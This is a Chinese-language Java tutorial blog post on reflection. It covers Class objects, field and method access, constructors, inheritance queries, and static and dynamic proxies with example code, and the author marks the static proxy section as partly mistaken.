<p>既然我们可以通过 Class 获得一个类的所有信息，那么我们就可以不通过 new 运算符，来创建一个实例了。你可能想问，为什么要不通过 new 运算符来创建实例呢？</p>
<p>因为在框架编写中，并不知道使用这个框架的人要传入什么类来完成某个功能，但是我们仍然需要实例化使用者传入的类，完成框架需要执行的任务。这里就需要在不知道一个类的情况下实例化一个类，因而 new 运算符就失效了。但是 Class 的出现可以让我们先将一个类转化为 Class 类型，然后利用 Class 实例化这个类，最后对其进行各种操作。</p>
<p>将一个类转化为 Class 的方法有三种：</p>
<ol>
<li>使用一些类的静态变量 <code>Class str=String.class;</code></li>
<li>使用一些类的实例提供的 <code>getClass()</code> 方法 <code>Class str=&quot;Xorex&quot;.getClass();</code></li>
<li>使用一个类的完整类名来得到 <code>Class str=Class.forName(&quot;java.lang.String&quot;);</code></li>
</ol>
<h3 id="一个类一个Class"><a href="#一个类一个Class" class="headerlink" title="一个类一个Class"></a>一个类一个Class</h3><p>我们用上面的方法，能获取一个类的 Class 实例，这个实例包含着这个类的所有信息。回想上面 JVM 执行的过程，就可以发现每个类在 JVM 中只有一个 Class 实例（因为实例是根据类的构成创建的，类是唯一的，数据也自然是唯一的），那么我们无论通过什么方法获得某个类的 Class 实例，它们都应该是引用了同一个实例，所以就可以使用 <code>==</code> 来验证我们获得的 Class 实例是否为同一个实例，如果是，那么两种获得 Class 实例的唯一性信息所映射出来的类是同一个类。</p>
<p>比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class One=<span class="string">&quot;Xorex&quot;</span>.getClass();</span><br><span class="line">CLass Two=<span class="string">&quot;Tempest&quot;</span>.getClass();</span><br><span class="line"><span class="keyword">if</span>(One==Two) System.out.println(<span class="string">&quot;They a from a same class.&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> System.out.println(<span class="string">&quot;They a from a different class.&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>其实这个特性是很理所当然的，对于一个类的信息，只保存一次，实例化的时候重复使用，节省内存。</p>
<h3 id="用类的Class实例来获得类的实例"><a href="#用类的Class实例来获得类的实例" class="headerlink" title="用类的Class实例来获得类的实例"></a>用类的Class实例来获得类的实例</h3><p>当我们反射出来一个 Class 实例之后，我们相当于掌握了一个完整的类，那么我们自然能够将建这个类的实例，方法也很简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class str=String.class;</span><br><span class="line">String s=(String)str.newInstance();</span><br></pre></td></tr></table></figure>
<p>这里 <code>(String)str.newInstance()</code> 就等价与 <code>new String()</code> 只不过这个创建实例的过程是由 Class 类的 <code>newInstance()</code> 方法实现的。利用这个方法创建实例是有很大的局限性的，在使用 <code>new String()</code> 的时候，会直接调用 String 的构造方法，在加上重载机制，可以在创建实例的时候给构造方法传入参数来初始化。但是 <code>newInstance()</code> 方法不可能对于一个未知的类的构造方法进行重载，所以就导致了使用反射机制创建的实例没有办法往对应类的构造方法里面传入参数。</p>
<h2 id="访问字段"><a href="#访问字段" class="headerlink" title="访问字段"></a>访问字段</h2><h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><p>在 <code>java.lang.reflect</code> 里面由一个类叫作 Field ，专门用来存储字段的信息，Class 类中存储类字段的数据类型就是 Field ，当然我们可以通过这个东西来存储我们从 Class 实例中得到的字段信息。</p>
<p>获得字段的方法有这些：</p>
<ol>
<li><code>getField(String name)</code> 返回 Field 数据，为名字为 name 的字段（包括父类）。</li>
<li><code>getDeclaredField(String name)</code> 作用同上，但不包括父类的字段。</li>
<li><code>getFields()</code> 返回 Field[] 数据，为该 Class 实例中所有的字段（包括父类）。</li>
<li><code>getDeclaredFields()</code> 同上，但不包括父类字段。</li>
</ol>
<p>前两个在使用的时候，需要处理可能抛出的异常 <code>NoSuchFieldException</code> 。</p>
<p>得到了一个字段 Field，而类 Field 里面包含了一些方法可以查看这个字段的详情信息，比如 <code>getName()</code> 和 <code>getType()</code> 获取字段的名字和类型。</p>
<h3 id="获取-修改-字段值"><a href="#获取-修改-字段值" class="headerlink" title="获取/修改 字段值"></a>获取/修改 字段值</h3><p>Field 类中有一个方法为 <code>get(Object)</code> ，将该类的实例作为参数传入可以得到这个字段在实例中的值，同样可以通过方法 <code>set(Object1,Object2)</code> ，来修改这个字段在实例 Object1 中的值为 object2，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Tempest Xorex=<span class="keyword">new</span> Tempest();</span><br><span class="line">        System.out.println(Tempest.class.getField(<span class="string">&quot;Blessing&quot;</span>).get(Xorex));</span><br><span class="line"></span><br><span class="line">        Tempest.class.getField(<span class="string">&quot;Blessing&quot;</span>).set(Xorex,<span class="string">&quot;The World&quot;</span>);</span><br><span class="line">        System.out.println(Tempest.class.getField(<span class="string">&quot;Blessing&quot;</span>).get(Xorex));</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String Blessing;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tempest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.Blessing=<span class="string">&quot;Software&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码通过 <code>Tempest</code> 的实例 <code>Xorex</code> 映射出来 <code>Tempest</code> 类，并反射出来对应的 <code>Class</code> 实例，然后使用 <code>Class</code> 类中的 <code>getField()</code> 方法获得了类型为 <code>Field</code> 的 <code>Tempest</code> 类的字段 <code>Blessing</code> 。最后使用 Field 类自带的 <code>get()</code> / <code>set()</code> 方法 获得/修改 了 <code>Tempest</code> 类对应实例 <code>Xorex</code> 的字段  <code>Blessing</code> 。</p>
<p>上面的话可能有点绕，但这就是整个调用的逻辑原理。</p>
<h2 id="访问方法"><a href="#访问方法" class="headerlink" title="访问方法"></a>访问方法</h2><h3 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h3><p>同样的，就像字段拥有自己的类 Field，方法也有属于自己的类 Method：</p>
<ul>
<li><code>Method getMethod(name, Class...)</code>：获取某个<code>public</code>的<code>Method</code>（包括父类）</li>
<li><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个<code>Method</code>（不包括父类）</li>
<li><code>Method[] getMethods()</code>：获取所有<code>public</code>的<code>Method</code>（包括父类）</li>
<li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（不包括父类）</li>
</ul>
<p>上面的参数里面有一条是 <code>Class...</code> ，这是因为有着重载的存在，对于一个名字的方法可能有多种签名，所以为了区分不同的方法需要把完整的方法签名传入进去，而 <code>Class...</code> 就是需要传入签名中的形参列表，只需要按照对应顺序传入对应数据类型的 Class 实例即可。如果对应的方法的形参为 <code>int x,String y</code> ，那么就需要将 <code>Class...</code> 写为 <code>int.class,String.class</code> 即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Tempest Xorex=<span class="keyword">new</span> Tempest();</span><br><span class="line">        System.out.println(Tempest.class.getMethod(<span class="string">&quot;GetAns&quot;</span>,<span class="keyword">int</span>.class,<span class="keyword">int</span>.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tempest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String Blessing;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tempest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.Blessing=<span class="string">&quot;Software&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetAns</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="keyword">this</span>.Blessing);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出的就是一个 Method 类型数据，<code>public void Tempest.GetAns(int,int)</code> 。</p>
<p>还可以利用的 Method 类的一些方法来输出实例的固定信息：</p>
<ul>
<li><code>getName()</code>：返回方法名称，例如：<code>&quot;getScore&quot;</code>；</li>
<li><code>getReturnType()</code>：返回方法返回值类型，也是一个Class实例，例如：<code>String.class</code>；</li>
<li><code>getParameterTypes()</code>：返回方法的参数类型，是一个Class数组，例如：<code>&#123;String.class, int.class&#125;</code>；</li>
<li><code>getModifiers()</code>：返回方法的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li>
</ul>
<h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><ol>
<li><strong>调用普通方法</strong></li>
</ol>
<p>调用方法使用 Method 类的 <code>invoke(Object,MethodParameter...)</code>  方法，其中 Object 参数传入一个方法所在类的实例，<code>MethodParameter...</code> 传入对应方法需要的参数。需要注意的是，这个 Method 实例在获得的时候就已经确定了是具体的某个方法了，所以参数方法要严格按照对应的方法签名传进去，不要妄想在 Method 里面玩方法重载。</p>
<p>比如上面代码获得的 Method 就可以这样调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tempest.class.getMethod(<span class="string">&quot;GetAns&quot;</span>,<span class="keyword">int</span>.class,<span class="keyword">int</span>.class).invoke(Xorex,<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>调用静态方法</strong></li>
</ol>
<p>调用静态方法的话，方式和前面都是一样的，唯一的不同的是，最后使用 <code>invoke()</code> 方法的时候就不必须传入一个实例了，可以传入一个 null 来补位，比如把上面的方法 <code>GetAns()</code> 修改成静态方法之后，就可以不单独搞一个实例作为参数传进入了（当然你想传入实例的话也可以，没什么影响），直接用 null 补位：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tempest.class.getMethod(<span class="string">&quot;GetAns&quot;</span>,<span class="keyword">int</span>.class,<span class="keyword">int</span>.class).invoke(<span class="keyword">null</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li><strong>调用多态方法</strong></li>
</ol>
<p>当我们用反射出来的父类 Class 得到的一个父类的方法 Method 之后，传入一个子类的实例调用此 Method ，会发现这个 Method 实际执行的方法是子类的方法而不是父类的。</p>
<p>说明 Method 没有保存方法的代码，而只是保留了方法签名，还是利用引用的关系进行方法调用。所以调用一个实现了多态的方法的时候，是遵循多态原则的（实际运行的是子类重写过的方法）</p>
<p>具体内部的原理虽然能强行推出来一个还算合理的解释，但是无法验证真伪，这些东西牵扯到的知识面比较广，和 JVM 以及这些类的底层实现代码有关，暂且放一放，以后会好好研究一下它们到底是如何运作起来的。</p>
<p>暂且记住：使用 <strong>反射调用方法</strong> 时，仍然 <strong>遵循多态原则</strong> ：即总是调用实际类型的覆写方法。</p>
<h2 id="调用构造方法"><a href="#调用构造方法" class="headerlink" title="调用构造方法"></a>调用构造方法</h2><p>在前面我们利用反射出来的 Class 来创建对应类的实例的时候，Class 的 <code>newInstance()</code> 拥有着无法调用有参数的构造方法的问题，那么 Reflect 就提供了一个 Constructor 类，专门用来解决这个问题。</p>
<p>首先导入 Constructor 类之后，需要使用方法 <code>getConstructor(Parameter...)</code>从 Class 里面获得构造方法的信息，因为构造方法的名字和类名相同，所以就不需要方法名作为参数，按照去掉方法名的 <code>getMethod()</code> 一样，直接填充对应构造方法的实参即可。</p>
<p>得到 Constructor 的实例之后，就可以利用里面的方法 <code>newInstance()</code> 来构造一个实例，不过这次，可以往里面填对应构造方法的实参了，算是解决了 Class 自己的 <code>newInstance()</code> 的一个小缺陷。</p>
<p>下面是代码演示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Constructor con=Integer.class.getConstructor(<span class="keyword">int</span>.class);<span class="comment">//选择构造方法</span></span><br><span class="line">        Integer Xorex=(Integer)con.newInstance(<span class="number">10</span>);</span><br><span class="line">        System.out.println(Xorex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们利用 Constructor 获得了 Integer 类中的构造方法 <code>Integer(int)</code> 的信息，然后用它的实例的 <code>newInstance(int)</code> 方法成功调用 Integer 类中的构造方法 <code>Integer(int)</code> ，并实例化出来一个 Integer 对象。</p>
<h2 id="获取继承关系"><a href="#获取继承关系" class="headerlink" title="获取继承关系"></a>获取继承关系</h2><h3 id="获取父类"><a href="#获取父类" class="headerlink" title="获取父类"></a>获取父类</h3><p>使用 Class 类中的 <code>getSuperClass()</code> 可以获取这个 Class 实例表示的类的父类，返回的是父类的 Class 实例。我们就可以利用它来看一些类的继承关系：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class Xorex=NullPointerException.class;</span><br><span class="line"><span class="keyword">while</span>(Xorex!=<span class="keyword">null</span>) &#123;</span><br><span class="line">    System.out.println(Xorex);</span><br><span class="line">    Xorex=Xorex.getSuperclass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就会一路打印继承关系，到了 Object 类，因为没有父类，所以返回的是 null，结束循环。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">NullPointerException</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">RuntimeException</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Exception</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Throwable</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span></span></span><br></pre></td></tr></table></figure>
<h3 id="获取实现接口"><a href="#获取实现接口" class="headerlink" title="获取实现接口"></a>获取实现接口</h3><p>这里是使用 <code>getInterfaces()</code> 返回一个 Class 的数组，遍历就能得到实现的所有接口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class Xorex=Integer.class;</span><br><span class="line">Class[] Tempest=Xorex.getInterfaces();</span><br><span class="line"><span class="keyword">for</span>(Class i:Tempest) System.out.println(i);</span><br></pre></td></tr></table></figure>
<p>输出 Integer 类实现的所有接口（不包括父类实现的接口）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Comparable</span></span></span><br><span class="line"><span class="class"><span class="title">interface</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">constant</span>.<span class="title">Constable</span></span></span><br><span class="line"><span class="class"><span class="title">interface</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">constant</span>.<span class="title">ConstantDesc</span></span></span><br></pre></td></tr></table></figure>
<h3 id="判断向上转型"><a href="#判断向上转型" class="headerlink" title="判断向上转型"></a>判断向上转型</h3><p>判断一个实例的类是不是另外一个类的子类的时候，可以使用 instanceof 操作符，如果是，那么这个实例就可向上转型为另外一个类的实例。那么两个 Class 如何判断是否有继承关系呢？</p>
<p>可以使用 Class 类的方法 <code>Class1.isAssignableFrom(Class2)</code> 来确定 Class1 是否继承了 Class2 ，返回一个布尔值。</p>
<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>注意！！！这里有误，将代理类的代理对象给搞错了，代理类的代理对象是调用者。原本调用者去访问目标类，加入代理类之后，是代理类代替调用者去访问目标类。</p>
<p>举个例子：我想点份外卖，但是手机没电了，于是我让同学用他手机帮我点外卖。在这个过程中，其实就是我同学（代理对象）帮我（被代理的对象）代理了点外卖（被代理的行为），在这个过程中，同学可以完全控制点外卖的店铺、使用的APP，甚至把外卖直接吃了都行（对行为的完全控制）。</p>
<p>所以下面的很多逻辑都是错误的，请看最新的文章：设计模式：<a href="https://xorex.space/2021/03/11/41a99764aa02/">结构模型笔记</a> 里面对两种代理模式的解释进行了重写。</p>
<hr>
<p>当我们调用一个第三方的类完成一些任务的时候，发现这个第三方的类没有办法满足我们的需求，需要添加一些功能，但是我们又不能修改人家第三方类的代码，在调用库的类里面添加功能则会打乱我们的业务实现逻辑。这个时候，我们就可以再新建一个类，作为代理类，在这个类里面添加新业务实现的代码，然后用第三方的类完成补充。最后我们再通过对这个代理类的调用实现整个业务需求。</p>
<p>这样我们就通过代理操作，新建了一个类对第三方类进行 “修改” 以满足业务需求，同时原有的代码结构不变，不过是从直接操作第三方类变成了直接操作代理类。</p>
<p>这就是静态代理： <strong>代理类 = 原类 + 增强代码</strong></p>
<p><img src="https://xorex.space/image/169.jpg" alt="preview"></p>
<p>我们直接对代理类的操作即可，代理类会完成对原类的完善。以后修改代码只需要修改代理类，原调用地方是不需要修改代码的。</p>
<p>我们来看一段静态代理的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arg)</span> </span>&#123;</span><br><span class="line">        Helloimplements hello = <span class="keyword">new</span> Helloimplements(); <span class="comment">//第三方类</span></span><br><span class="line">        StaticProxy proxy = <span class="keyword">new</span> StaticProxy(); <span class="comment">// 新建代理类</span></span><br><span class="line">        proxy.setImpl(hello); <span class="comment">// 代理类绑定第三方类</span></span><br><span class="line">        proxy.sayHello(<span class="string">&quot;Jerry&quot;</span>); <span class="comment">// 用操作代理类</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayGoogBye</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helloimplements</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>&#123; <span class="comment">//需要被代理的类</span></span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayGoogBye</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; GoodBye!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticProxy</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>&#123; <span class="comment">// 自己写的静态代理类</span></span><br><span class="line">    <span class="keyword">private</span> IHello iHello;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setImpl</span><span class="params">(IHello impl)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iHello = impl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The new codes...&quot;</span>); <span class="comment">// 需要补充的新代码</span></span><br><span class="line">        iHello.sayHello(name); <span class="comment">//调用第三方类的方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayGoogBye</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The new codes...&quot;</span>); <span class="comment">// 需要补充的代码</span></span><br><span class="line">        iHello.sayGoogBye(name); <span class="comment">// 调用第三方类的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>前面说类静态代理，说是静态代理是因为这些过程在运行的时候都是不变的，编译生成 <code>.class</code> 文件是在 JVM <strong>运行之前</strong>完成的。但是动态代理的代理类，是在 JVM <strong>运行中</strong>生成的 <code>.class</code> 的。</p>
<p>动态代理有什么好处吗，为什么在 JVM 运行中生成有什么用啊？</p>
<p>当然有用，它最大的用处就是在运行中生成。在静态代理中，如果我们需要对大量的原类进行编写增强代码相似的代理类，重复的工作就太多了。于是我们想要在程序运行的时候，根据实际所对应的原类能自动生成需要的代理类，我们只用写一次代理类模板，就能直接代理所有的原类，那就太方便了。想到动态代理可以在程序运行中生成代理类，这不就是我们想要的嘛，写一个代理类模板，运行的时候依次生成所有原类的代理类，这样以后修改增强代码只需要在代理类模板修改即可。</p>
<p>看下图，这里静态代理和动态代理最大的区别就是多了一个中间处理方法 invoke() ，这个invoke() 里面就是用来写增强代码的地方，里面对原类的各种调用利用反射来完成。只需要将原类传进代理生成器，就能利用反射生成一个原类对应的代理类，最后只要操作这个生成的代理类即可。修改代码只修改 invoke()</p>
<p><img src="https://xorex.space/image/170.jpg" alt="preview"></p>
<p>为了能生成代理类，就需要有模板 <code>InvocationHandler.invoke()</code> ，这个是我们自己通过重写实现的，然后需要一个代理类生成器：<code>Proxy.newProxyInstance()</code> ，最后，只需要将模板和数据塞入代理类生成器，就能量产代理类了。</p>
<p>下面就是代码的具体实现上面的需求：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arg)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 新建一个集成了生成器和模板的 动态代理生成工厂</span></span><br><span class="line">        DynamicProxyHello helloproxy = <span class="keyword">new</span> DynamicProxyHello();</span><br><span class="line">        <span class="comment">// 新建一个需要被代理的类的实例hello</span></span><br><span class="line">        Helloimplements hello = <span class="keyword">new</span> Helloimplements();</span><br><span class="line">        <span class="comment">// 调用动态代理生成工厂的 生成方法 让其返回生成的代理类实例</span></span><br><span class="line">        IHello ihello = (IHello) helloproxy.bind(hello); </span><br><span class="line">        <span class="comment">// 调用被生成的代理类实例</span></span><br><span class="line">        ihello.sayHello(<span class="string">&quot;Jerry&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 集成了 代理类生成器+代理类生成模板</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicProxyHello</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object delegate;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里调用代理类生成器，传入需要的数据，然后返回生成的代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">bind</span><span class="params">(Object delegate)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">this</span>.delegate = delegate;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 借助此方法生成动态代理类</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance( </span><br><span class="line">        <span class="keyword">this</span>.delegate.getClass().getClassLoader(), <span class="keyword">this</span>.delegate</span><br><span class="line">        .getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// 生成的代理类中，所有的方法里面都只会调用这个方法，为模板</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Object result = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;The Adding Code...&quot;</span>); </span><br><span class="line">            <span class="comment">// JVM通过这条语句执行原类的方法(反射机制)</span></span><br><span class="line">            result = method.invoke(<span class="keyword">this</span>.delegate, args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 需要被代理的类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helloimplements</span> <span class="keyword">implements</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayGoogBye</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; GoodBye!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 统一操作接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IHello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayGoogBye</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先写一个代理类模板 ，来规定生成的代理类都有哪些对应的功能，这就是 <code>InvocationHandler</code> 接口的 <code>invoke()</code> 需要实现功能。而我们上面代码定义这个 <code>invoke()</code>  为多输出了一段字符串，然后调用被代理实例的某个方法。然后又定义了启动代理类生成器 <code>Proxy.newProxyInstance()</code>  的方法 <code>bind()</code> ，用来将被代理实例和模板通过代理类生成器绑定，从而生成被代理实例需要的代理类。</p>
<p>对于 <code>InvocationHandler</code> 接口需要被实现的 <code>invoke()</code> 方法为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>proxy 为被代理的实例</p>
</li>
<li><p>method 为需要调用实例的方法</p>
</li>
<li><p>args 为调用的时候接受的参数</p>
</li>
</ul>
<p>上面三个参数的如何传递并不需要关心，这些 <code>Proxy.newProxyInstance()</code> 对自动生成填写合适参数的代理类。</p>
<p>然后就是  <code>Proxy.newProxyInstance()</code> 的定义了：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)</span>  <span class="keyword">throws</span> IllegalArgumentException</span></span><br></pre></td></tr></table></figure>
<ul>
<li>loader 需要传入被代理实例的类加载器，使用 <code>Instance.getClass().getClassLoader()</code> 获得名字为 Instance 的被代理实例的类加载器，共给生成的代理类使用。</li>
<li>ingerfaces 按照被代理类实现的接口来对应生成代理类，使用 <code>Instance.getClass().getInterfaces()</code> 就可以获得名字为 Instance 的被代理实例实现的接口了。</li>
